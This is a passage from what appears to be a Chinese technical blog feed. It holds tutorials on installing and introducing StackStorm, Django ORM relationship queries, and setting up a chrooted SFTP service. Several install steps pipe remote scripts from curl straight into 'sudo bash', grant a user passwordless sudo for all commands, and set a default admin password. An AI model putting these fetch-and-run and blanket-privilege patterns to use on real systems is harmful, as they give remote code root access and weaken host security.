/home/stanley/.ssh/authorized_keys'sudo chown -R stanley:stanley /home/stanley/.ssh# Enable passwordless sudosudo sh -c 'echo "stanley ALL=(ALL) NOPASSWD: SETENV: ALL" &gt;&gt; /etc/sudoers.d/st2'sudo chmod 0440 /etc/sudoers.d/st2# Make sure `Defaults requiretty` is disabled in `/etc/sudoers`sudo sed -i -r "s/^Defaults\s+\+?requiretty/# Defaults +requiretty/g" /etc/sudoers 在远程主机上配置SSH访问并启用无密码sudo，StackStorm将通过SSH运行远程操作。使用上一步中生成的公钥，按照配置SSH中的说明进行操作。要控制Windows框，请为Windows运行程序配置访问权限 。 如果您使用的是其他用户或SSH密钥的路径，则需要在以下位置更改此部分/etc/st2/st2.conf： 123[system_user]user = stanleyssh_key_file = /home/stanley/.ssh/stanley_rsa 启动服务 启动服务： 1sudo st2ctl start 注册传感器，规则和操作： 1sudo st2ctl reload 校验以下命令将测试StackStorm安装。他们都应该成功完成： 123456789101112131415161718st2 --versionst2 -h# List the actions from a 'core' packst2 action list --pack=core# Run a local shell commandst2 run core.local -- date -R# See the execution resultsst2 execution list# Fire a remote comand via SSH (Requires passwordless SSH)st2 run core.remote hosts='localhost' -- uname -a# Install a packst2 pack install st2 使用supervisor脚本管理StackStorm服务： 1sudo st2ctl start|stop|status|restart|restart-component|reload|clean 以愉快地使用StackStorm了。 但没有Web UI就没有乐趣，没有SSL或身份验证就没有安全感，没有ChatOps就没有乐趣，没有Extreme Workflow Composer就没钱了。继续阅读！ 配置验证为简单起见，参考部署使用基于文件的身份验证提供程序。请参阅 身份验证以配置和使用PAM或LDAP身份验证后端。 要使用基于文件的提供程序设置身份验证： 使用密码创建用户： 1234# Install htpasswd utility if you don't have itsudo yum -y install httpd-tools# Create a user record in a password file.echo 'Ch@ngeMe' | sudo htpasswd -i /etc/st2/htpasswd st2admin 启用并配置身份验证/etc/st2/st2.conf： 123456[auth]# ...enable = Truebackend = flat_filebackend_kwargs = &#123;"file_path": "/etc/st2/htpasswd"&#125;# ... 重启st2api服务： 1sudo st2ctl restart-component st2api 验证，并检查它是否有效： 12345# Login - you will be prompted for password (default 'Ch@ngeMe')st2 login st2admin# Check that it worksst2 action list 安装WebUI并设置SSL终止NGINX用于提供WebUI静态文件，将HTTP重定向到HTTPS，提供SSL终止，以及反向代理st2auth和st2api API端点。要进行设置：安装 st2web和nginx包，生成证书或放置现有证书/etc/ssl/st2，并使用StackStorm提供的站点配置文件st2.conf配置nginx StackStorm依赖于Nginx版本&gt; = 1.7.5。RHEL在软件包存储库中有一个旧版本，因此您需要添加官方Nginx存储库： 123456789101112131415161718192021222324252627282930313233# Add key and repo for the latest stable nginxsudo rpm --import http://nginx.org/keys/nginx_signing.keysudo sh -c "cat &lt;&lt;EOT &gt; /etc/yum.repos.d/nginx.repo[nginx]name=nginx repobaseurl=http://nginx.org/packages/rhel/\\\$releasever/x86_64/gpgcheck=1enabled=1EOT"# Ensure that EPEL repo is not used for nginxsudo sed -i 's/^\(enabled=1\)$/exclude=nginx\n\1/g' /etc/yum.repos.d/epel.repo# Install nginxsudo yum install -y nginx# Install st2websudo yum install -y st2web# Generate a self-signed certificate or place your existing certificate under /etc/ssl/st2sudo mkdir -p /etc/ssl/st2sudo openssl req -x509 -newkey rsa:2048 -keyout /etc/ssl/st2/st2.key -out /etc/ssl/st2/st2.crt \-days 365 -nodes -subj "/C=US/ST=California/L=Palo Alto/O=StackStorm/OU=Information \Technology/CN=$(hostname)"# Copy and enable the supplied nginx config filesudo cp /usr/share/doc/st2/conf/nginx/st2.conf /etc/nginx/conf.d/# Disable default_server configuration in existing /etc/nginx/nginx.confsudo sed -i 's/default_server//g' /etc/nginx/nginx.confsudo systemctl restart nginxsudo systemctl enable nginx 如果修改nginx配置中的ports或url路径，请在st2web配置中进行相应的更改/opt/stackstorm/static/webui/config.js 使用浏览器连接https://${ST2_HOSTNAME}并登录WebUI 如果您无法连接到Web浏览器，则可能需要更改默认防火墙设置。您可以使用以下命令执行此操作： 12firewall-cmd --zone=public --add-service=http --add-service=httpsfirewall-cmd --zone=public --permanent --add-service=http --add-service=https 这将允许入站HTTP（端口80）和HTTPS（端口443）流量，并使这些更改在重新启动后继续存在。 如果您尝试从框外访问API并且已根据这些说明配置了nginx，请使用https://${EXTERNAL_IP}/api/v1/${REST_ENDPOINT}。 例如： 1curl -X GET -H 'Connection: keep-alive' -H 'User-Agent: manual/curl' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'X-Auth-Token: &lt;YOUR_TOKEN&gt;' https://1.2.3.4/api/v1/actions 同样，您可以使用连接到auth REST端点https://${EXTERNAL_IP}/auth/v1/${AUTH_ENDPOINT}。 您可以通过向--debugCLI命令添加适当资源的选项来查看资源的实际REST端点。 例如，要查看获取操作的端点，请调用： 1st2 --debug action list 设置ChatOps如果您已经运行了Hubot实例，则可以安装hubot-stackstorm插件并配置StackStorm环境变量，如下所述。否则，启用StackStorm ChatOps的最简单方法 是使用st2chatops包。 验证chatops是否已安装该包，并启用了通知规则： 1234# Ensure chatops pack is in placels /opt/stackstorm/packs/chatops# Create notification rule if not yet enabledst2 rule get chatops.notify || st2 rule create /opt/stackstorm/packs/chatops/rules/notify_hubot.yaml 添加NodeJS v10存储库： 1curl -sL https://rpm.nodesource.com/setup_10.x | sudo -E bash - 安装st2chatops包： 1sudo yum install -y st2chatops 查看并编辑/opt/stackstorm/chatops/st2chatops.env配置文件，将其指向StackStorm安装和您正在使用的聊天服务。您至少应该生成 API密钥并设置ST2_API_KEY变量。默认情况下st2api，st2auth预计它们位于同一主机上。如果不是这种情况，请更新ST2_API和ST2_AUTH_URL变量或只是指向正确的主机 ST2_HOSTNAME。 示例配置使用Slack。要进行此设置，请转到Slack Web管理界面，创建一个Bot，然后将身份验证令牌复制到HUBOT_SLACK_TOKEN。 如果您使用的是其他聊天服务，请在以下部分中设置相应的环境变量 ： Slack， HipChat，Flowdock， IRC， Mattermost， RocketChat，XMPP。Chat service adapter settings``st2chatops.env 启动服务： 1234sudo systemctl start st2chatops# Start st2chatops on bootsudo systemctl enable st2chatops 重新加载st2包以确保chatops.notify注册规则： 1sudo st2ctl reload --register-all 开始聊天吧！！！ 安全注意事项默认情况下，安装MongoDB，RabbitMQ和PostgreSQL时，它们会禁用身份验证或使用默认静态密码。因此，在安装这些服务之后，您应该配置它们并使用强大的随机生成的密码启用身份验证。 注意：如果您使用StackStorm安装脚本，则会自动完成此操作。 为这些服务配置授权和密码超出了本文档的范围。有关更多信息，请参阅以下链接 MongoDB的- https://docs.mongodb.com/manual/tutorial/enable-authentication/，https://docs.mongodb.com/manual/core/authorization/ RabbitMQ - https://www.rabbitmq.com/authentication.html PostgreSQL - https://www.postgresql.org/docs/9.4/static/auth-methods.html 为这些组件启用身份验证后，还需要更新StackStorm服务以使用新设置。 这意味着编辑以下配置选项： StackStorm - /etc/st2/st2.conf database.username - MongoDB数据库用户名。 database.password - MongoDB数据库密码。 messaging.url- RabbitMQ传输网址（amqp://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;:5672） 2，mistral - /etc/mistral/mistral.conf database.connection- PostgreSQL数据库连接字符串（postgresql+psycopg2://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;/mistral） transport_url- RabbitMQ传输网址（rabbit://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;:5672） 此外，强烈建议您遵循以下最佳实践来运行网络服务： 确保服务之间的通信已加密。为MongoDB，RabbitMQ和PostgreSQL启用SSL / TLS。 将服务配置为仅侦听localhost，并在需要时侦听内部IP地址。通常不需要StackStorm（MongoDB，RabbitMQ，PostgreSQL）使用的大多数服务在公共IP地址上可用。 配置防火墙并设置白名单。防火墙应仅允许那些需要访问这些服务的用户和系统进行访问。API和auth服务通常需要您的用户可访问，但其他相关服务（如MongoDB，RabbitMQ和PostgreSQL）则不需要。这些不应该由用户直接访问，并且只允许StackStorm组件与它们通信。 在可能的情况下，您还应该使用其他基于网络的隔离和安全功能，例如DMZ。 上述步骤对于StackStorm组件在多个服务器上运行的分布式生产部署尤为重要。 升级到Extreme Workflow ComposerExtreme Workflow Composer将Workflow Designer（用于创建/编辑工作流的图形工具），RBAC和LDAP添加到StackStorm。它作为一组附加软件包部署在StackStorm之上。您将需要一个有效的Extreme Workflow Composer订阅和一个许可证密钥来访问Extreme Workflow Composer存储库。 要了解有关Extreme Workflow Composer的更多信息，请求报价或获取评估许可证，请访问stackstorm.com/product。 要安装Extreme Workflow Composer，请${EWC_LICENSE_KEY}在下面的命令中使用您在注册或购买时收到的密钥进行替换，然后运行以下命令： 12345# Set up Extreme Workflow Composer repository accesscurl -s https://$&#123;EWC_LICENSE_KEY&#125;:@packagecloud.io/install/repositories/StackStorm/enterprise/script.rpm.sh | sudo bash# Install Extreme Workflow Composersudo yum install -y bwc-enterprisesudo st2ctl restart]]></content>
      <categories>
        <category>运维研发</category>
        <category>自动化平台</category>
      </categories>
      <tags>
        <tag>Stackstorm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Stackstorm的介绍与入门]]></title>
    <url>%2Farticles%2F514c154e.html</url>
    <content type="text"><![CDATA[介绍一句话概况：stackstorm是一个事件驱动的自动化引擎。 官方解释：StackStorm是一个功能强大的开源自动化平台，可将所有应用程序，服务和工作流程连接起来。 它具有可扩展性，灵活性, 设计中包含了对DevOps和ChatOps的热爱。它可以将您现有的基础架构和应用程序环境联系在一起，以便您可以更轻松地自动化操作该环境。它特别专注于针对事件采取行动。 主要用途： 便利的故障排除 - 触发由Nagios，Sensu，New Relic和其他监控系统捕获的系统故障，在物理节点、OpenStack或Amazon实例和应用程序组件上运行一系列诊断检查，并将结果发布到共享通信环境中，如HipChat或JIRA。 自动修复 - 识别和验证OpenStack计算节点上的硬件故障，正确排空实例并向管理员发送关于潜在停机时间的电子邮件，但如果出现任何问题 - 冻结工作流程并呼叫PagerDuty唤醒人员。 持续部署 - 与Jenkins一起构建和测试，配置新的AWS群集，基于NewRelic的应用程序性能数据，打开负载均衡器的一些流量，以及前滚或回滚。 参考文档官网 工作原理 主要组成角色： 传感器（Sensors）是用于分别接收或监视事件的入站或出站集成的Python插件。 当来自外部系统的事件发生并由传感器处理时，StackStorm触发器将发射到系统中。 触发器（Triggers）是外部事件的StackStorm表示形式。 有通用触发器（例如定时器，webhooks）和集成触发器（例如，Sensu告警，JIRA问题更新）。 通过编写传感器插件可以定义新的触发器类型。 动作（Actions）是StackStorm出站集成。 有通用动作（ssh，REST调用），集成（OpenStack，Docker，Puppet）或自定义操作。 动作是Python插件或任何脚本，通过添加几行元数据将其消耗到StackStorm中。 动作可以由用户通过CLI或API直接调用，或者作为规则和工作流程的一部分使用和调用。 规则（Rules）将触发器映射到动作（或工作流），应用匹配条件并将触发器加载到动作输入中。 工作流（Workflows）将动作拼接成“超级动作”，定义顺序，转换条件以及传递数据。 大多数自动化不止一步，因此需要多个动作。 工作流就像“原子”动作一样，可在Action库中使用，并且可以手动调用或由规则触发。 包(Packs)是内容部署的单位。 它们通过对集成（触发器和动作）和自动化（规则和工作流）进行分组，简化了StackStorm可插拔内容的管理和共享。 StackStorm Exchange上有越来越多的包可用。 用户可以创建自己的包，在Github上共享它们，或者提交给StackStorm Exchange. 审计跟踪（Audit Trail）记录并存储手动或自动操作执行的审计跟踪，并存储触发上下文和执行结果的全部细节。 它还被记录在审计日志中，用于集成外部日志记录和分析工具：LogStash，Splunk，statsd，syslog StackStorm是一种具有模块化架构的服务。它包括松散耦合的服务组件，这些组件通过消息总线进行通信，并且可以水平扩展以实现大规模自动化。StackStorm具有Web UI，CLI客户端，当然还有完整的REST API。我们还提供Python客户端绑定，以使开发人员的生活更轻松。 流程StackStorm通过包含sensors和actions的可扩展套件插入环境中。 从各个服务系统通过push或pull的方式把event传给sensors, sensors会产生一个trigger 到规则配置中查询该trigger对应的动作或者工作流 将来自工作流的Action发送到消息队列（内置rabbitmq）中 Actions到达外部的系统后就执行相应的动作 日志和审计历史被推送到数据库进行存储（Mongodb） 处理后的结果被发送回规则引擎进行进一步处理 备注：由于笔者是刚接触，未有实践经验，所以仅仅是根据官方文档直译，有不当之处欢迎大家一起纠正!]]></content>
      <categories>
        <category>运维研发</category>
        <category>自动化平台</category>
      </categories>
      <tags>
        <tag>Stackstorm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django ORM模型详解]]></title>
    <url>%2Farticles%2F2c7f73f3.html</url>
    <content type="text"><![CDATA[目的Django框架后面对数据库的ORM操作已经帮我们做了，我们只需要在创建model时，按照框架定义创建即可。但定义的几种ORM操作有哪些区别和怎么去操作呢？本篇详细说明。 案例12345678910111213141516171819202122232425#_*_coding:utf-8_*_from django.db import models # Create your models here. class Colors(models.Model): colors=models.CharField(max_length=10) #蓝色 def __str__(self): return self.colors class Ball(models.Model): color=models.OneToOneField("Colors") #与颜色表为一对一，颜色表为母表 description=models.CharField(max_length=10) #描述 def __str__(self): return self.description class Clothes(models.Model): color=models.ForeignKey("Colors") #与颜色表为外键，颜色表为母表 description=models.CharField(max_length=10) #描述 def __str__(self): return self.description class Child(models.Model): name=models.CharField(max_length=10) #姓名 favor=models.ManyToManyField('Colors') #与颜色表为多对多 表中体现一对一：子表从母表中选出一条数据一一对应，母表中选出来一条就少一条，子表不可以再选择母表中已被选择的那条数据 一对多：子表从母表中选出一条数据一一对应，但母表的这条数据还可以被其他子表数据选择 共同点是在admin中添加数据的话，都会出现一个select选框，但只能单选，因为不论一对一还是一对多，自己都是“一” 多对多：会各自创建一张表，并在第三张表中记录对应关系。 应用场景一对一：一般用于某张表的补充，比如用户基本信息是一张表，但并非每一个用户都需要有登录的权限，不需要记录用户名和密码，此时，合理的做法就是新建一张记录登录信息的表，与用户信息进行一对一的关联，可以方便的从子表查询母表信息或反向查询 一对多（外键）：有很多的应用场景，比如每个员工归属于一个部门，那么就可以让员工表的部门字段与部门表进行一对多关联，可以查询到一个员工归属于哪个部门，也可反向查出某一部门有哪些员工 多对多：如很多公司，一台服务器可能会有多种用途，归属于多个产品线当中，那么服务器与产品线之间就可以做成对多对，多对多在A表添加manytomany字段或者从B表添加，效果一致 一对一查： 123456789101112#子表查询母表,找到红球对应的颜色#写法1：print(models.Ball.objects.get(description="红球").color.colors) #返回红，通过子表查询母表，写法："子表对象.母表表名的小写.母表字段名" ；通过Ball表查到description为"红球"，查找到对应colors#写法2，反向从母表入手：print(models.Colors.objects.get(ball__description="红球").colors) #返回红，通过子表查询母表，但形式上是从母表对象自身直接获取字段，写法："母表.objects.get(子表名小写__子表字段="xxx").母表字段名" ；效果和上边完全一致，另一种形式#母表查询子表，找到红色对应的球的名字#写法1：print(models.Colors.objects.get(colors="红").ball.description) #返回红球，通过母表查询子表，写法："母表对象.子表表名的小写.子表字段名"；找到颜色为红色的Ball的description#写法2，反向从子表入手：print(models.Ball.objects.get(color__colors="红").description) #返回红球，通过母表查询子表，但形式上是从子表对象自身直接获取字段，写法："子表.objects.get(一对一的子表字段__母表字段="xxx").子表字段"；效果和上边完全一致，另一种形式 增： 123#添加一种颜色黑，并添加黑球color_obj=models.Colors.objects.create(colors="黑") #先在母表中创建颜色，并实例化给颜色表对象models.Ball.objects.create(color=color_obj,description="黑球") #更新Ball表，color字段为颜色表对象，添加description字段 备注：增添数据的3种常用方式 123456789101112131415#增添数据的三种写法：#写法1：color_obj=models.Colors.objects.create(colors="黑")models.Ball.objects.create(color=color_obj,description="黑球")#写法1补充：color_id=models.Colors.objects.create(colors="黑").idmodels.Ball.objects.create(color_id=color_id,description="黑球")#写法2：color_obj=models.Colors.objects.create(colors="黑")ball_obj=models.Ball(color=color_obj,description="黑球")ball_obj.save()#写法3(字典导入)：color_obj=models.Colors.objects.create(colors="黑")ball_dic=&#123;'description':"黑球"&#125;models.Ball.objects.create(color=color_obj,**ball_dic) 改： 1234color_obj=models.Colors.objects.get(colors="黑") #.get()等同于.filter().first()color_obj.colors="灰"color_obj.save()models.Ball.objects.filter(description="黑球").update(color=color_obj,description="灰球") #update(),delete()是QuerySet的方法 备注：修改数据的常见方式 12345678910#更新一条数据color_obj=models.Colors.objects.get(colors="黑")color_obj.colors="灰"color_obj.save()#更新多条数据，把满足条件的球的description都变为灰球#写法1：models.Ball.objects.filter(color__colors="红").update(description="灰球")#写法2：up_dic=&#123;"description":"灰球"&#125;models.Ball.objects.filter(id__gt=0).update(**up_dic) 删： 1234models.Ball.objects.get(description="灰球").delete() #对象和QuerySet都有方法delete()models.Colors.objects.filter(colors="灰").delete()models.Colors.objects.all().delete() #清空一张表 一对多（外键）查： 123456789101112131415161718192021#外键表联合查询：#外键子表查询母表,与一对一子表查询母表形式一致#找到红裤衩所属的颜色表中的颜色--返回:红#写法1：print(models.Clothes.objects.get(description="小虎哥").color.colors) #返回红，通过子表查询母表，写法："子表对象.母表表名的小写.母表字段名" ；通过Clothes表查到description为"小虎哥"，查找到对应colors#写法2，反向从母表入手：print(models.Colors.objects.get(clothes__description="小虎哥").colors) #返回红，通过子表查询母表，但形式上是从母表对象自身直接获取字段，写法："母表.objects.get(子表名小写__子表字段="xxx").母表字段名" ；效果和上边完全一致，另一种形式#外键母表查询子表,与一对一形式不同，因为母表为"多"，不能像一对一一样通过.get().子表.子表字段的方式获取，但与多对多母表查询子表一致#找到颜色为红的所有服装--返回:[&lt;Clothes: 大美女&gt;, &lt;Clothes: 小虎哥&gt;]#写法1：color_obj=models.Colors.objects.get(colors="红")print(color_obj.clothes_set.all()) #注意：子表小写_set的写法,它实际上是一个QuerySet,可以用update,delete,all,filter等方法#写法2：print(models.Clothes.objects.filter(color=models.Colors.objects.get(colors="红")))#写法2简便写法（推荐）：print(models.Clothes.objects.filter(color__colors="红")) #写法：filter(子表外键字段__母表字段='过滤条件')#写法3：color_id=models.Colors.objects.get(colors="红").id #通过母表获取到颜色为红的idprint(models.Clothes.objects.filter(color_id=color_id)) #filter得到QuerySet,写法：filter(子表外键字段_母表主键=母表主键对象) 备注：通过QuerySet的.values()方法，将QuerySet转化为ValuesQuerySet 12345678910111213141516171819print(models.Clothes.objects.filter(color=models.Colors.objects.get(colors="红")).values('color__colors','description')) #获取子表的description字段，和母表的colors字段，获取母表字段写法: 子表外键字段名__母表字段名--适用于values()或filter()#简写形式补充：print(models.Clothes.objects.filter(color__colors="红").values('color__colors','description'))#返回：[&#123;'description': u'\u7ea2\u5185\u8863', 'color__colors': u'\u7ea2'&#125;, &#123;'description': u'\u7ea2\u5185\u88e4', 'color__colors': u'\u7ea2'&#125;]#如果不加values(),返回的是[&lt;Clothes: 大美女&gt;, &lt;Clothes: 小虎哥&gt;]这样一个QuerySet集合，通过values可以形成一个列表，列表中的每一个元素是一个字典，可以通过list()将ValuesQeurySet转化为列表，之后返回给templates#另外可通过.values_list()将QuerySet转化为ValuesListQuerySet。返回：[(u'\u7ea2', u'\u7ea2\u889c\u5b50'), (u'\u7ea2', u'\u7ea2\u889c\u5b50')]#得到的是一个列表，列表中是多个元组，每个元组是ValuesQuerySet中字典的value，常用于从models里将数据取出后动态添加到前端模板中的select选项中。#通过forms.py从models取值传给前端select选项，需重启django后，select选项才能更新，可在定义form时，添加如下关键字保障动态更新select选项#forms.pyfrom django import formsfrom test1 import modelsclass ClothesForm(forms.Form): color=forms.IntegerField(required=True,widget=forms.Select(),) def __init__(self,*args,**kwargs): #定义这个关键字段，当使用form时，colors表新增了颜色，前端ClothesForm的color字段的选项会自动更新 super(ClothesForm, self).__init__(*args,**kwargs) self.fields['color'].widget.choices=models.Colors.objects.all().order_by('id').values_list('id','colors') 增： 12345678910#增添子表数据，形式与一对一一致#添加颜色为绿的服装：小帅哥#方法1：models.Clothes.objects.create(color=models.Colors.objects.get(colors="绿"),description="小帅哥")#方法1补充：models.Clothes.objects.create(color_id=models.Colors.objects.get(colors="绿").id,description="小帅哥")#方法2：c_obj=models.Clothes(color=models.Colors.objects.get(colors="绿"),description="小帅哥")c_obj.save()#方法3：字典方式录入..参考一对一 改： 123456789#颜色为红的服装，description都更新为大美女#写法1：models.Clothes.objects.filter(color__colors="红").update(description="大美女")#写法2：models.Clothes.objects.filter(color_id=models.Colors.objects.get(colors="红").id).update(description="大美女")#写法3：colors_obj=models.Colors.objects.get(colors="红")colors_obj.clothes_set.filter(id__gte=1).update(description="大美女")#其他写法参照一对一的修改和外键的查询 删： 12models.Clothes.objects.get(description="灰裙子").delete() #对象和QuerySet都有方法delete()models.Colors.objects.filter(colors="灰").delete() 多对多查： 123456789101112131415161718192021#多对多子表查询母表,查找小明喜欢哪些颜色--返回:[&lt;Colors: 红&gt;, &lt;Colors: 黄&gt;, &lt;Colors: 蓝&gt;]#与一对多子表查询母表的形式不同，因为一对多，查询的是母表的“一”；多对多，查询的是母表的“多”#写法1：child_obj=models.Child.objects.get(name="小明") #写法：子表对象.子表多对多字段.过滤条件(all()/filter())print(child_obj.favor.all())#写法2，反向从母表入手：print(models.Colors.objects.filter(child__name="小明")) #母表对象.filter(子表表名小写__子表字段名="过滤条件")#多对多母表查询子表,查找有哪些人喜欢黄色--返回:[&lt;Child: 小明&gt;, &lt;Child: 丫蛋&gt;]#与一对多母表查询子表的形式完全一致，因为查到的都是QuerySet，一对多和多对多，都是在查询子表的“多”#写法1：color_obj=models.Colors.objects.get(colors="黄")print(color_obj.child_set.all())#写法2：print(models.Child.objects.filter(favor=models.Colors.objects.get(colors="黄")))#写法2简便写法(推荐):print(models.Child.objects.filter(favor__colors="黄")) #写法：filter(子表外键字段__母表字段='过滤条件')#写法3：color_id=models.Colors.objects.get(colors="黄").id #通过母表获取到颜色为红的idprint(models.Child.objects.filter(favor=color_id)) #filter得到QuerySet,写法：filter(子表外键字段=母表主键对象),此处和一对多略有不同，是子表外键字段而不是外键字段_母表主键 增与改（增添子表或母表数据参照一对一的增，多对多重点在于关系表的对应关系变更）： 12345678910111213141516171819202122232425262728293031323334#添加子表关联关系#添加小虎并让他喜欢所有颜色#写法1：child_obj=models.Child.objects.create(name="小虎") #如果是已有用户，使用.get()colors_obj=models.Colors.objects.all() #创建颜色表的所有颜色QuerySet对象child_obj.favor.add(*colors_obj) #添加对应关系,将小虎和所有颜色进行关联，写法：子表对象.子表多对多字段.add(*QuerySet对象)#写法2：child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.all()child_obj.favor=colors_objchild_obj.save()#让小虎喜欢黄色和蓝色(2种写法和上边一致，只展示一种写法)child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.filter(colors__in=["蓝","黄"]) #models默认只能用这种方式得到并集，如需更复杂的过滤逻辑，需使用模块Qchild_obj.favor.clear() #清空小虎已经喜欢的颜色child_obj.favor.add(*colors_obj) #add是追加模式，如果当前小虎已经喜欢绿色，那么执行后，小虎会额外喜欢蓝，黄#让小虎喜欢绿色(2种写法和上边一致，只展示一种写法)child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.get(colors="绿")child_obj.favor.clear()child_obj.favor.add(colors_obj) #此处没有*#添加母表关联关系#让喜欢蓝色的人里添加小虎,可以用上边的方法，一个效果，让小虎喜欢蓝色，下边介绍反向插入(从母表入手)的写法child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.get(colors="蓝")colors_obj.child_set.add(child_obj) #从colors表插入小虎，写法：母表对象.子表名小写_set.add(子表对象)。 让喜欢蓝色的child_set集合添加name="小虎"#让所有人都喜欢蓝色children_obj=models.Child.objects.all()colors_obj=models.Colors.objects.get(colors="蓝")colors_obj.child_set.add(*children_obj)#关于_set写法，是否已经有些晕了，究竟什么时候使用_set,简单记忆，只有子表才有"子表名小写_set"的写法，得到的是一个QuerySet集合，后边可以接.add(),.remove(),.update(),.delete(),.clear()#另外备注一下，colors_obj.child_set.clear()是让所有人喜欢的颜色里去掉蓝色，colors_obj.child_set.all().delete()是删除.child_set的所有人 删： 删除多对多表关系 ： 12345678910111213141516171819202122232425#删除子表与母表关联关系#让小虎不喜欢任何颜色#写法1：child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.all()child_obj.favor=''child_obj.save()#写法2：child_obj=models.Child.objects.get(name="小虎")colors_obj=models.Colors.objects.all()child_obj.favor.remove(*colors_obj)#写法3：child_obj=models.Child.objects.get(name="小虎")child_obj.favor.clear()#其他例子参照多对多的增与改案例，这里不做举例#删除母表与子表关联关系#让所有人不再喜欢蓝色#写法1：children_obj=models.Child.objects.all()colors_obj=models.Colors.objects.get(colors="蓝")colors_obj.child_set.remove(*children_obj)#写法2：colors_obj=models.Colors.objects.get(colors="蓝")colors_obj.child_set.clear() 删除多对多表数据： 123456#删除子表数据#喜欢蓝色的所有人都删掉colors_obj=models.Colors.objects.get(colors="蓝")colors_obj.child_set.all().delete() #注意有.all()#删除所有childmodels.Child.objects.all().delete() 删除母表数据: 默认情况下，如此例中，删除“红”色，那么子表与颜色表是一对一或外键关系的，子表对应数据会自动删除，如：红球，小虎哥与颜色表是多对多关系的话，不会自动删除喜欢红色的人，而是去掉红色已选如果想让与母表外键关联的子表在删除外键之后依旧可以保留子表数据，需要子表建表时加入以下字段： 123class Clothes(models.Model): color=models.ForeignKey("Colors",null=True,on_delete=models.SET_NULL)) #可为空，如果外键被删后，子表数据此字段置空而不是直接删除这条数据，同理也可以SET_DEFAULT,需要此字段有默认值 description=models.CharField(max_length=10) #描述 choice1234567891011121314#choices相当于实现一个简化版的外键，外键的选项不能动态更新，如可选项目较少，可以采用#先在models添加choices字段class Child(models.Model): sex_choice=((0,"男"),(1,"女")) name=models.CharField(max_length=10) #姓名 favor=models.ManyToManyField('Colors') #与颜色表为多对多 sex=models.IntegerField(choices=sex_choice,default=0) def __unicode__(self): return self.name#在views.py中调用child_obj=models.Child.objects.get(name="小虎")print(child_obj.sex) #返回0或1print(child_obj.get_sex_display()) #返回男或女]]></content>
      <categories>
        <category>运维研发</category>
        <category>语言积累</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sftp和ftp文件传输服务]]></title>
    <url>%2Farticles%2F81de25e2.html</url>
    <content type="text"><![CDATA[适用场景我们平时习惯了使用ftp来上传下载文件，尤其是很多Linux环境下，我们一般都会通过第三方的SSH工具连接到Linux，但是当我们需要传输文件到Linux服务器当中，很多人习惯用ftp来传输，其实Linux默认是不提供ftp的，需要你额外安装FTP服务器。而且ftp服务器端会占用一定的VPS服务器资源。其实更建议使用sftp代替ftp。理由如下： 可以不用额外安装任何服务器端程序 会更省系统资源。 SFTP使用加密传输认证信息和传输数据，相对来说会更安全。 也不需要单独配置，对新手来说比较简单(开启SSH默认就开启了SFTP)。 主要区别FTP是一种文件传输协议，一般是为了方便数据共享的。包括一个FTP服务器和多个FTP客户端。FTP客户端通过FTP协议在服务器上下载资源。而SFTP协议是在FTP的基础上对数据进行加密，使得传输的数据相对来说更安全。但是这种安全是以牺牲效率为代价的，也就是说SFTP的传输效率比FTP要低(不过现实使用当中，没有发现多大差别)。 摘抄来自百度百科 sftp是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。SFTP 为 SSH的其中一部分，是一种传输档案至 Blogger 伺服器的安全方式。其实在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接和答复操作，所以从某种意义上来说，SFTP并不像一个服务器程序，而更像是一个客户端程序。SFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密/解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。 创建通信账号添加sftp组1groupadd sftp 新增用户创建一个sftp用户，用户名为mysftp，密码为mysftp 修改用户密码和修改Linux用户密码是一样的。 12useradd -g sftp -s /bin/false mysftp #用户名passwd mysftp #密码 创建登陆默认访问路径sftp组的用户的home目录统一指定到/data/sftp下，按用户名区分，这里先新建一个mysftp目录，然后指定mysftp的home为/data/sftp/mysftp 12mkdir -p /data/sftp/mysftp usermod -d /data/sftp/mysftp mysftp 修改sftp配置123456789101112vi /etc/ssh/sshd_config#找到如下这行，用#符号注释掉，大致在文件末尾处。# Subsystem sftp /usr/libexec/openssh/sftp-server #在文件最后面添加如下几行内容，然后保存。Subsystem sftp internal-sftp Match Group sftp ChrootDirectory /data/sftp/%u ForceCommand internal-sftp AllowTcpForwarding no X11Forwarding no 设定Chroot目录权限12chown root:sftp /data/sftp/mysftp chmod 755 /data/sftp/mysftp 建立SFTP用户登入后可写入的目录照上面设置后，在重启sshd服务后，用户mysftp已经可以登录。但使用chroot指定根目录后，根应该是无法写入的，所以要新建一个目录供mysftp上传文件。这个目录所有者为mysftp，所有组为sftp，所有者有写入权限，而所有组无写入权限。命令如下： 123mkdir /data/sftp/mysftp/upload chown mysftp:sftp /data/sftp/mysftp/upload chmod 755 /data/sftp/mysftp/upload 用ChrootDirectory将用户的根目录指定到/data/BJIP-JAVA/histmp/ ，这样用户就只能在/data/BJIP-JAVA/histmp/下活动。 创建登陆默认访问路径 mkdir -p /appdata/BJIP-JAVA/histmp/ usermod -d /appdata/BJIP-JAVA/histmp/ liuxing12配置目录权限chmod -R 755 /appdata/BJIP-JAVA/histmp/chown liuxing:sftp /appdata/BJIP-JAVA/histmp/12修改sftp配置用ChrootDirectory将用户的根目录指定到/appdata/BJIP-JAVA/histmp/ ，这样用户就只能在/appdata/BJIP-JAVA/histmp/下活动。 重启sshd服务1service sshd restart 